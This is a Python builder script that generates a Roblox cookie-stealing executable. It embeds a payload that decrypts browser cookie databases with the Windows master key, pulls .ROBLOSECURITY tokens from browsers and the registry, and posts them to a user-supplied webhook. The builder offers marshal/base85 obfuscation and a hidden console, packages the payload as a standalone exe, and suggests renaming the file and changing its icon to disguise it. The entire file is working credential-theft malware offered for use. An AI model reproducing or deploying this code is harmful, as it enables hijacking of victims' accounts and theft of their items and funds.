import os
import base64
import shutil
import marshal
import traceback
import subprocess

if "Python was not found; run without arguments to install from the Microsoft Store, or disable this shortcut from Settings > Manage App Execution Aliases." in subprocess.check_output("python --version").decode():
    os.system("powershell Remove-Item $env:LOCALAPPDATA\Microsoft\WindowsApps\python.exe") # Remove the bugged app alias that Microsoft added (Because Microsoft doesn't do anything right)
    os.system("cls")

if "is not recognized" in subprocess.check_output("python --version").decode():
    print("Python is not added to PATH! Reinstall Python and make sure to tick the Add Python to PATH box!")
    while True: pass

os.system("python -m pip install pyinstaller pypiwin32 pycryptodome requests")
os.system("cls")

if "is not recognized" in subprocess.check_output("pyinstaller --version").decode():
    print("Python is not added to PATH! Reinstall Python and make sure to tick the Add Python to PATH box!")
    while True: pass

webhook = input("Paste your Webhook: ")
obfuscate = input("Obfuscate (Encrypt) the code? (Y/N): ")
console = input("Show the Console when running? (Y/N): ")

id = base64.b64encode(os.urandom(16)).decode().replace("=","").replace("/","")

code = f"""
webhook = "{webhook}" # WEBHOOK HERE

import os
import json
import base64
import shutil
import sqlite3
import requests
import subprocess

from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES 

def safe(func):
    def wrapper(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except Exception:
            pass
    return wrapper

class CookieLogger:

    appdata = os.getenv('APPDATA')
    localappdata = os.getenv('LOCALAPPDATA')

    def __init__(self):
        browsers = self.findBrowsers()

        cookies = []
        for browser in browsers:
            try:
                cookies.append(self.getCookie(browser[0], browser[1]))
            except Exception:
                pass

        try:
            cookies.append(("Roblox App", ("None", '\\n'.join(line for line in subprocess.check_output(r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com' -Name .ROBLOSECURITY", creationflags=0x08000000, shell=True).decode().strip().splitlines() if line.strip()))))
        except Exception:
            pass
        
        cookieDoc = ""

        for cookie in cookies:
            if cookie == None or not cookie[1]:
                continue

            for _cookie in cookie[1]:
                cookieDoc += f"Browser: {{cookie[0]}}\\nProfile: {{_cookie[0]}}\\nCookie: {{_cookie[1]}}\\n\\n"
                
        if not cookieDoc: cookieDoc = "No Cookies Found!"
        
        requests.post(webhook, files = {{"cookies.txt": cookieDoc}})
    
    @safe
    def findBrowsers(self):
        found = []

        for root in [self.appdata, self.localappdata]:
            for directory in os.listdir(root):
                try:
                    for _root, _, _ in os.walk(os.path.join(root, directory)):
                        for file in os.listdir(_root):
                            if file == "Local State":
                                if "Default" in os.listdir(_root):
                                    found.append([_root, True])
                                elif "Login Data" in os.listdir(_root):
                                    found.append([_root, False])
                                else:
                                    pass
                except Exception:
                    pass

        return found

    @safe
    def getMasterKey(self, browserPath):
        with open(os.path.join(browserPath, "Local State"), "r", encoding = "utf8") as f:
            localState = json.loads(f.read())
        
        masterKey = base64.b64decode(localState["os_crypt"]["encrypted_key"])
        truncatedMasterKey = masterKey[5:]

        return CryptUnprotectData(truncatedMasterKey, None, None, None, 0)[1]

    @safe
    def decryptCookie(self, cookie, masterKey):
        iv = cookie[3:15]
        encryptedValue = cookie[15:]

        cipher = AES.new(masterKey, AES.MODE_GCM, iv)
        decryptedValue = cipher.decrypt(encryptedValue)

        return decryptedValue[:-16].decode()

    @safe
    def getCookie(self, browserPath, isProfiled):

        if browserPath.split("\\\\")[-1] == "User Data":
            browserName = browserPath.split("\\\\")[-2]
        else:
            browserName = browserPath.split("\\\\")[-1]
        
        cookiesFound = []

        profiles = ["Default"]
        try:
            masterKey = self.getMasterKey(browserPath)
        except Exception:
            return cookiesFound

        if isProfiled:
            for directory in os.listdir(browserPath):
                if directory.startswith("Profile"):
                    profiles.append(directory)
        
        if not isProfiled:
            if "Network" in os.listdir(browserPath):
                cookiePath = os.path.join(browserPath, "Network", "Cookies")
            else:
                cookiePath = os.path.join(browserPath, "Cookies")
            
            shutil.copy2(cookiePath, "temp.db")
            connection = sqlite3.connect("temp.db")
            cursor = connection.cursor()

            cursor.execute("SELECT encrypted_value FROM cookies")
            for cookie in cursor.fetchall():
                if cookie[0]:
                    decrypted = self.decryptCookie(cookie[0], masterKey)

                    if decrypted.startswith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"):
                        cookiesFound.append(("None", decrypted))
                
            connection.close()
            os.remove("temp.db")
        
        else:
            for profile in profiles:
                if "Network" in os.listdir(os.path.join(browserPath, profile)):
                    cookiePath = os.path.join(browserPath, profile, "Network", "Cookies")
                else:
                    cookiePath = os.path.join(browserPath, profile, "Cookies")

                shutil.copy2(cookiePath, "temp.db")
                connection = sqlite3.connect("temp.db")
                cursor = connection.cursor()

                cursor.execute("SELECT encrypted_value FROM cookies")
                for cookie in cursor.fetchall():
                    if cookie[0]:
                        decrypted = self.decryptCookie(cookie[0], masterKey)

                        if decrypted.startswith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"):
                            cookiesFound.append((profile, decrypted))
                
                connection.close()
                os.remove("temp.db")

        return [browserName, cookiesFound]

if __name__ == "__main__":
    CookieLogger()

"""

try:
    if obfuscate.lower().startswith("Y"):
        newcode = f"""
    import os;import json;import base64;import shutil;import sqlite3;import requests;import subprocess;import marshal;from win32crypt import CryptUnprotectData;from Crypto.Cipher import AES;exec(marshal.loads(base64.b85decode(b"{base64.b85encode(marshal.dumps(compile(code, id, "exec"))).decode()}")))"""
    else:
        newcode = code

    open(f"tmp_{id}.py", "w").write(newcode)

    os.system(f"pyinstaller --clean {'--noconsole ' if console.lower().startswith('Y') else ''}--onefile tmp_{id}.py")

    shutil.copy2(f"dist\\tmp_{id}.exe", "output.exe")
    shutil.rmtree("dist")
    shutil.rmtree("build")
    os.remove(f"tmp_{id}.py")
    os.remove(f"tmp_{id}.spec")

    os.system("cls")

    print("Done!\nYou can rename to file\nTo change the icon, download a .ico file as well as Resource Hacker. Then replace the resource. You can find a tutorial on how to do this on YouTube.")
    while True: pass
except Exception:
    print(traceback.format_exc() + "\n\nAn Error occured! See above, and make an issue on the GitHub repository or contact me if you can't solve it yourself!")
    while True: pass
